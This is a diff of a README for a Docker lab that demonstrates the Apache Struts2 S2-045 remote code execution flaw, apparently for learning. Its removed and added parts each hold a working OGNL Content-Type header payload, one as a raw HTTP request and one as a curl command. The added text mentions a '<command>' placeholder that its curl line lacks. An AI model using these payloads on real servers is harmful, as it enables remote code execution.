@@ -1,42 +1,88 @@
-# S2-045 Remote Code Execution Vulnerablity（CVE-2017-5638）
 
-[中文版本(Chinese version)](README.zh-cn.md)
+# Apache Struts2 S2-045 RCE (CVE-2017-5638)
 
-Affected Version: Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10
+## 📌 Overview
 
-References:
+This project demonstrates the **Remote Code Execution (RCE) vulnerability** in Apache Struts2 (CVE-2017-5638).
 
- - http://struts.apache.org/docs/s2-045.html
- - https://nsfocusglobal.com/apache-struts2-remote-code-execution-vulnerability-s2-045/
+Attackers can exploit a crafted HTTP `Content-Type` header to execute arbitrary system commands on vulnerable servers.
 
-## Setup
+This repo uses **Vulhub Docker labs** to provide a safe environment to test and understand the vulnerability.
 
-Execute the following command to start the Struts2 2.3.30：
+---
 
+## 🛠 Environment Setup
+
+* **Host:** Ubuntu 24.04 (VirtualBox or Native)
+* **Docker & Docker Compose**
+* **Vulhub Lab**
+* **Apache Struts2 version:** 2.3.30
+
+---
+
+## 🚀 Getting Started
+
+1️⃣ **Clone this repo**
+
+```bash
+git clone https://github.com/soufiane-benchahyd/vulhub-struts2.git
+cd vulhub-struts2/struts2/s2-045
 ```
+
+2️⃣ **Start the vulnerable container**
+
+```bash
 docker compose up -d
 ```
 
-After the container is running, visit `http://your-ip:8080` that you can see an example of the upload page.
+3️⃣ **Verify container is running**
 
-## Exploitation
-
-Verify the vulnerability by following request:
-
-```
-POST / HTTP/1.1
-Host: localhost:8080
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.8,es;q=0.6
-Connection: close
-Content-Length: 0
-Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data
-
-
+```bash
+docker ps
 ```
 
-`233*233` has been successfully executed:
+You should see something like:
 
-![](1.png)
+```
+CONTAINER ID   IMAGE                   COMMAND                  STATUS      PORTS
+xxxxxxx        vulhub/struts2:2.3.30   "/usr/local/bin/mvn-…"   Up          0.0.0.0:8080->8080/tcp
+```
+
+4️⃣ **Test the web interface**
+
+Open your browser → `http://<VM_IP>:8080`
+You should see the Struts2 application homepage.
+
+> VM IP example: `192.168.56.101`
+
+---
+
+## 💻 Exploitation
+
+> ⚠️ Only perform exploitation in a **controlled lab environment**. Never attack public servers.
+
+You can now test the RCE using scripts or tools like `curl` or Metasploit against the vulnerable container.
+
+Example (replace `<command>` with your test command):
+
+```bash
+curl -v -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','test')}" http://<VM_IP>:8080/
+```
+
+---
+
+## 📝 Notes
+
+* This lab is **safe**: all actions occur inside Docker.
+* Screenshots of your test can be added later to GitHub.
+* You can extend this repo with **other Struts2 vulnerabilities** for a full learning portfolio.
+
+---
+
+## ⚡ References
+
+* [Apache Struts2 S2-045 CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638)
+* [Vulhub GitHub](https://github.com/vulhub/vulhub)
+
+
+
